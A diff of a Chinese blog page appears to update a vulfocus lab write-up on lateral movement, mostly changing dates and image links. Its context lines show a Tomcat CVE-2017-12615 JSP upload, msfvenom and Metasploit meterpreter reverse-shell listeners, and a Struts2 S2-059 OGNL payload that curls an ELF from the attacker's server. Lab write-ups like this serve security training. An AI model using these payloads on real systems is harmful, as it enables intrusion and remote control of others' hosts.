@@ -46,7 +46,7 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png">
 <meta property="article:published_time" content="2022-10-08T16:00:00.000Z">
-<meta property="article:modified_time" content="2022-10-09T12:18:01.311Z">
+<meta property="article:modified_time" content="2022-10-14T03:06:39.728Z">
 <meta property="article:author" content="JiangA23187">
 <meta property="article:tag" content="靶场wp">
 <meta name="twitter:card" content="summary">
@@ -2192,7 +2192,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     root: '/',
     debug: false,
     default: {"avatar":"https://unpkg.com/volantis-static@0.0.1660614606622/media/placeholder/avatar/round/3442075.svg","link":"https://unpkg.com/volantis-static@0.0.1660614606622/media/placeholder/link/8f277b4ee0ecd.svg","cover":"https://unpkg.com/volantis-static@0.0.1660614606622/media/placeholder/cover/76b86c0226ffd.svg","image":"https://unpkg.com/volantis-static@0.0.1660614606622/media/placeholder/image/2659360.svg"},
-    lastupdate: new Date(1665715648550),
+    lastupdate: new Date(1665716828870),
     cdn: {
       izitoast_css: 'https://cdn.bootcdn.net/ajax/libs/izitoast/1.4.0/css/iziToast.min.css',
       izitoast_js: 'https://cdn.bootcdn.net/ajax/libs/izitoast/1.4.0/js/iziToast.min.js',
@@ -2693,7 +2693,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 <p><strong>ms开启监听</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload linux/x86/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 服务器ip</span><br><span class="line">set LPORT 7777</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://tupian-1308226518.cos.ap-guangzhou.myqcloud.com/typora/202209141044450.png" class="lazyload" data-srcset="https://tupian-1308226518.cos.ap-guangzhou.myqcloud.com/typora/202209141044450.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220914104411255"></p>
+<p><img src="https://tupian-1308226518.cos.ap-guangzhou.myqcloud.com/typora/202210141106584.png" class="lazyload" data-srcset="https://tupian-1308226518.cos.ap-guangzhou.myqcloud.com/typora/202210141106584.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20221014110403634"></p>
 <p>成功接收到会话</p>
 <h2 id="内网横向"><a href="#内网横向" class="headerlink" title="内网横向"></a>内网横向</h2><h3 id="内网主机探查"><a href="#内网主机探查" class="headerlink" title="内网主机探查"></a>内网主机探查</h3><h2 id="主机1"><a href="#主机1" class="headerlink" title="主机1"></a>主机1</h2><p>在该台主机发现多张网卡</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">10.0.0.39</span><br><span class="line">172.18.0.31</span><br><span class="line">192.120.2.91</span><br><span class="line">192.120.4.66</span><br></pre></td></tr></table></figure>
@@ -2711,7 +2711,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
 <p>服务器打开对应端口</p>
 <p><strong>proxifier设置代理</strong></p>
-<p><img src="https://tupian-1308226518.cos.ap-guangzhou.myqcloud.com/typora/202209141108467.png" class="lazyload" data-srcset="https://tupian-1308226518.cos.ap-guangzhou.myqcloud.com/typora/202209141108467.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220914105621180"></p>
+<p><img src="https://tupian-1308226518.cos.ap-guangzhou.myqcloud.com/typora/202210141106571.png" class="lazyload" data-srcset="https://tupian-1308226518.cos.ap-guangzhou.myqcloud.com/typora/202210141106571.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20221014110426850"></p>
 <p>访问192.120.4.46:8080，发现tomcat服务v8.5.19</p>
 <h3 id="利用漏洞上线msf"><a href="#利用漏洞上线msf" class="headerlink" title="利用漏洞上线msf"></a>利用漏洞上线msf</h3><p>利用vulmap扫描，发现CVE-2017-12615</p>
 <p><img src="https://tupian-1308226518.cos.ap-guangzhou.myqcloud.com/typora/202209141108411.png" class="lazyload" data-srcset="https://tupian-1308226518.cos.ap-guangzhou.myqcloud.com/typora/202209141108411.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220914110234762"></p>
@@ -2719,7 +2719,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 <p><code>curl -v -X PUT --data-binary @shell.jsp &quot;http://192.120.4.46:8080/shell.jsp/&quot;</code></p>
 <p>连接</p>
 <p>msf生成shell.elf</p>
-<p><code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=1.12.49.84 LPORT=2333 -f elf -o shell.elf</code></p>
+<p><code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=ip LPORT=2333 -f elf -o shell.elf</code></p>
 <p>开启监听</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload linux/x86/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 服务器ip</span><br><span class="line">set LPORT 2333</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
 
@@ -2736,7 +2736,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 <p>在<a target="_blank" rel="noopener" href="http://192.120.1.49:8080/%E5%8F%91%E7%8E%B0sturts2">http://192.120.1.49:8080/发现sturts2</a> 服务</p>
 <p><img src="https://tupian-1308226518.cos.ap-guangzhou.myqcloud.com/typora/202209141735100.png" class="lazyload" data-srcset="https://tupian-1308226518.cos.ap-guangzhou.myqcloud.com/typora/202209141735100.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220914165432655"></p>
 <h3 id="利用S2-059漏洞上线msf"><a href="#利用S2-059漏洞上线msf" class="headerlink" title="利用S2-059漏洞上线msf"></a>利用S2-059漏洞上线msf</h3><p>设置burp socks 代理</p>
-<p><img src="https://tupian-1308226518.cos.ap-guangzhou.myqcloud.com/typora/202209141714799.png" class="lazyload" data-srcset="https://tupian-1308226518.cos.ap-guangzhou.myqcloud.com/typora/202209141714799.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220914171435749"></p>
+<p><img src="https://tupian-1308226518.cos.ap-guangzhou.myqcloud.com/typora/202210141106597.png" class="lazyload" data-srcset="https://tupian-1308226518.cos.ap-guangzhou.myqcloud.com/typora/202210141106597.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20221014110502671"></p>
 <p>抓包前关闭proxifier代理，使用浏览器代理工具代理，不然会抓不到包</p>
 <p>数据包</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">skillName=%25%7b%23_memberAccess.allowPrivateAccess%3Dtrue%2C%23_memberAccess.allowStaticMethodAccess%3Dtrue%2C%23_memberAccess.excludedClasses%3D%23_memberAccess.acceptProperties%2C%23_memberAccess.excludedPackageNamePatterns%3D%23_memberAccess.acceptProperties%2C%23res%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23a%3D%40java.lang.Runtime%40getRuntime()%2C%23s%3Dnew%20java.util.Scanner(%23a.exec(&#x27;curl 服务器ip:1111/1.elf&#x27;).getInputStream()).useDelimiter(&#x27;%5C%5C%5C%5CA&#x27;)%2C%23str%3D%23s.hasNext()%3F%23s.next()%3A&#x27;&#x27;%2C%23res.print(%23str)%2C%23res.close()%0A%7d</span><br></pre></td></tr></table></figure>
@@ -2748,7 +2748,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 <p><strong>msf开启监听</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload linux/x86/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 服务器ip</span><br><span class="line">set LPORT 1111</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://tupian-1308226518.cos.ap-guangzhou.myqcloud.com/typora/202209151158168.png" class="lazyload" data-srcset="https://tupian-1308226518.cos.ap-guangzhou.myqcloud.com/typora/202209151158168.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220915115848037"></p>
+<p><img src="https://tupian-1308226518.cos.ap-guangzhou.myqcloud.com/typora/202210141106602.png" class="lazyload" data-srcset="https://tupian-1308226518.cos.ap-guangzhou.myqcloud.com/typora/202210141106602.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20221014110539637"></p>
 <p>上线成功</p>
 <h2 id="主机3"><a href="#主机3" class="headerlink" title="主机3"></a>主机3</h2><p><strong>发现新网段</strong></p>
 <p><img src="https://tupian-1308226518.cos.ap-guangzhou.myqcloud.com/typora/202209151201381.png" class="lazyload" data-srcset="https://tupian-1308226518.cos.ap-guangzhou.myqcloud.com/typora/202209151201381.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220915120151331"></p>
@@ -2804,10 +2804,10 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     <div class='new-meta-box'>
       
         
-          <div class="new-meta-item date" itemprop="dateModified" datetime="2022-10-09T20:18:01+08:00">
+          <div class="new-meta-item date" itemprop="dateModified" datetime="2022-10-14T11:06:39+08:00">
   <a class='notlink'>
     <i class="fa-solid fa-edit fa-fw" aria-hidden="true"></i>
-    <p>更新于：2022年10月9日</p>
+    <p>更新于：2022年10月14日</p>
   </a>
 </div>
 
@@ -4007,7 +4007,7 @@ window.matchMedia('(prefers-color-scheme: light)').addListener(darkModelListener
 </script>
 
 
-  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"Blogs for JiangA23187","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"JiangA23187","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","sameAs":["https://github.com/volantis-x"],"description":""},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"http://example.com/","name":"Blogs for JiangA23187"}},{"@type":"ListItem","position":2,"item":{"@id":"http://example.com/categories/靶场wp/","name":"靶场wp"}},{"@type":"ListItem","position":3,"item":{"@id":"http://example.com/2022/10/09/内网死角/","name":"vulfocus场景 内网死角"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"Blogs for JiangA23187","url":"http://example.com/","keywords":null,"description":"","author":{"@type":"Person","name":"JiangA23187","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","description":""},"publisher":{"@type":"Organization","name":"Blogs for JiangA23187","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"http://example.com?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","headline":"vulfocus场景 内网死角","description":"","inLanguage":"zh-CN","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2022/10/09/%E5%86%85%E7%BD%91%E6%AD%BB%E8%A7%92/"},"author":{"@type":"Person","name":"JiangA23187","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/"},"publisher":{"@type":"Organization","name":"Blogs for JiangA23187","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"http://example.com/2022/10/09/%E5%86%85%E7%BD%91%E6%AD%BB%E8%A7%92/","wordCount":0,"datePublished":"2022-10-08T16:00:00.000Z","dateModified":"2022-10-09T12:18:01.311Z","articleSection":"靶场wp","keywords":"靶场wp","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
+  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"Blogs for JiangA23187","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"JiangA23187","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","sameAs":["https://github.com/volantis-x"],"description":""},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"http://example.com/","name":"Blogs for JiangA23187"}},{"@type":"ListItem","position":2,"item":{"@id":"http://example.com/categories/靶场wp/","name":"靶场wp"}},{"@type":"ListItem","position":3,"item":{"@id":"http://example.com/2022/10/09/内网死角/","name":"vulfocus场景 内网死角"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"Blogs for JiangA23187","url":"http://example.com/","keywords":null,"description":"","author":{"@type":"Person","name":"JiangA23187","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","description":""},"publisher":{"@type":"Organization","name":"Blogs for JiangA23187","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"http://example.com?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","headline":"vulfocus场景 内网死角","description":"","inLanguage":"zh-CN","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2022/10/09/%E5%86%85%E7%BD%91%E6%AD%BB%E8%A7%92/"},"author":{"@type":"Person","name":"JiangA23187","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/"},"publisher":{"@type":"Organization","name":"Blogs for JiangA23187","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"http://example.com/2022/10/09/%E5%86%85%E7%BD%91%E6%AD%BB%E8%A7%92/","wordCount":0,"datePublished":"2022-10-08T16:00:00.000Z","dateModified":"2022-10-14T03:06:39.728Z","articleSection":"靶场wp","keywords":"靶场wp","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
 
 
 
